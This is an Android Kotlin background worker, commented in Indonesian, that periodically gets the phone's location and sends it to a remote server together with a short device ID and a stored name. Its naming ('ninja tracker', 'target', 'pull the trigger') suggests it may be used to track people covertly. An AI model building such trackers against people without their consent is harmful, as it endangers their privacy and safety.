package com.hanafi.han

import android.provider.Settings
import android.annotation.SuppressLint
import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import java.net.HttpURLConnection
import java.net.URL

class LocationWorker(appContext: Context, workerParams: WorkerParameters) : CoroutineWorker(appContext, workerParams) {

    @SuppressLint("MissingPermission")
    override suspend fun doWork(): Result {
        return try {
            val fusedLocationClient = LocationServices.getFusedLocationProviderClient(applicationContext)
            
            // Mengambil lokasi (akurasi seimbang agar hemat baterai)
            val location = fusedLocationClient.getCurrentLocation(Priority.PRIORITY_BALANCED_POWER_ACCURACY, null).await()

            if (location != null) {
                val latitude = location.latitude
                val longitude = location.longitude
                
                Log.d("PelacakNinja", "Lokasi Ditemukan: $latitude, $longitude")

                // Kirim ke server
                kirimKeServer(latitude, longitude)
            }

            Result.success()
        } catch (e: Exception) {
            Log.e("PelacakNinja", "Gagal mengambil lokasi: ${e.message}")
            Result.retry() // Coba lagi nanti jika gagal
        }
    }

    private suspend fun kirimKeServer(lat: Double, lon: Double) {
        withContext(Dispatchers.IO) {
            try {
                // 1. Ambil "Nomor Rangka Mesin" asli dari HP (Permanent Phone ID)
                val androidId = Settings.Secure.getString(applicationContext.contentResolver, Settings.Secure.ANDROID_ID)
                
                // Ambil 6 huruf/angka pertama saja agar rapi, contoh: "HP_A1B2C3"
                val idUnik = androidId?.take(6)?.uppercase() ?: "UNKNOWN"
                val targetId = "HP_$idUnik"

                // 2. Membaca "Brankas Lokal" di HP hanya untuk mencari Nama Custom (jika ada)
                val sharedPref = applicationContext.getSharedPreferences("PelacakPrefs", Context.MODE_PRIVATE)
                var targetNama = sharedPref.getString("nama_input", "")

                // 3. Jika nama kosong, gunakan Phone ID sebagai nama
                if (targetNama.isNullOrEmpty()) {
                    targetNama = targetId
                }

                // 4. Enkripsi nama agar aman dikirim lewat URL (menghindari error karena spasi)
                val namaAman = java.net.URLEncoder.encode(targetNama, "UTF-8")

                // 5. Merakit peluru (URL Tembakan Baru)
                val urlServer = "https://mymaps.hanavy.online/api/update?id=$targetId&nama=$namaAman&lat=$lat&lon=$lon"
                val url = URL(urlServer)
                
                // === 6. TARIK PELATUKNYA DI SINI! (Kirim ke Vercel) ===
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "GET"
                connection.connectTimeout = 5000 // Batas waktu tunggu 5 detik
                
                val responseCode = connection.responseCode
                Log.d("PelacakNinja", "Status Tembakan Permanen ($targetId) ke Markas: $responseCode")
                
                connection.disconnect()
                // ===================================================

            } catch (e: Exception) {
                Log.e("PelacakNinja", "Gagal mengirim ke server: ${e.message}")
            }
        }
    }
}